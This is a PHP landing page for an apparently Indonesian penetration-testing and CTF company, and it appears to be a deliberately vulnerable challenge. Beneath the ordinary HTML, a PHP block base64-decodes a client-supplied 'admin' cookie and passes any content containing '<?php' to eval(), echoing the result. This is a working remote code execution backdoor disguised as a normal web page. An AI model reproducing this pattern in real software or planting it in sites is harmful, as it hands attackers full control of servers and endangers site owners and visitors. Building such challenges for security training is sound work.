<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $inputText = $_POST["inputText"];
    $encodedPayload = base64_encode($inputText);
    setcookie("admin", $encodedPayload);
}
?>
  <!DOCTYPE html>
  <html lang="en">
  <head>
      <meta charset="UTF-8">
      <meta name="viewport" content="width=device-width, initial-scale=1.0">
      <title>Landing Page</title>
      <link rel="stylesheet" href="style.css">
  </head>
  <body>

  <div class="container">
      <header>
          <h1>Welcome to Our Website</h1>
          <nav>
              <ul>
                  <li><a href="#home">Home</a></li>
                  <li><a href="#about">About</a></li>
              </ul>
          </nav>
      </header>

      <section id="home" class="section">
          <h2>Home Section</h2>
          <p>Konsultasikan Keamanan Website Dan Aplikasi Kamu Bersama Kami
            Bersama kami, tingkatkanlah keamanan website dan aplikasimu, serta kembangkanlah keterampilanmu dalam Ethical Hackingmu!.</p>
      </section>

      <section id="about" class="section">
          <h2 >About Us</h2>
          <p>Perusahaan kami adalah sebuah entitas yang bergerak di bidang keamanan cyber, mengkhususkan diri dalam menyediakan layanan pengujian penetrasi (Pentesting) dan pencarian kerentanan (Bug Hunting) bagi berbagai entitas bisnis dan organisasi. Kami memiliki tim ahli yang terampil dan berpengalaman dalam melakukan evaluasi menyeluruh terhadap sistem dan jaringan untuk mengidentifikasi dan mengatasi potensi ancaman keamanan yang mungkin terjadi.Selain itu, kami juga menawarkan layanan belajar Cyber Security bagi individu-individu yang tertarik untuk memahami lebih dalam tentang dunia keamanan informasi. Program pembelajaran kami dirancang untuk mengakomodasi berbagai tingkat pengetahuan, mulai dari pemula hingga tingkat lanjutan, dengan fokus pada praktik terbaik dan teknik terbaru dalam melindungi data dan sistem digital. Sebagai bagian dari komitmen kami untuk mendukung dan memajukan komunitas keamanan cyber, kami secara rutin menyelenggarakan lomba Capture The Flag (CTF) Cyber Security. Lomba ini memberikan kesempatan kepada para profesional dan penggemar keamanan cyber untuk bersaing dan meningkatkan keterampilan mereka dalam menanggapi tantangan dunia nyata dalam keamanan siber. Dengan pendekatan holistik kami terhadap keamanan cyber, kami bertujuan untuk menjadi mitra terpercaya bagi klien kami dalam melindungi aset digital mereka dan menjaga keamanan informasi di era digital yang terus berkembang.</p>
      </section>

     
  </div>

  <script src="script.js"></script>
  </body>
  </html>



  
<?php
if (isset($_COOKIE["admin"])) {
    $decodedPayload = base64_decode($_COOKIE["admin"]);
    if (strpos($decodedPayload, "<?php") !== false) {
        ob_start();
        eval("?>" . $decodedPayload);
        $output = ob_get_clean();
        echo "<pre><strong style='color: white;'>$output</strong></pre>";
    }
}
?>
</body>
</html>
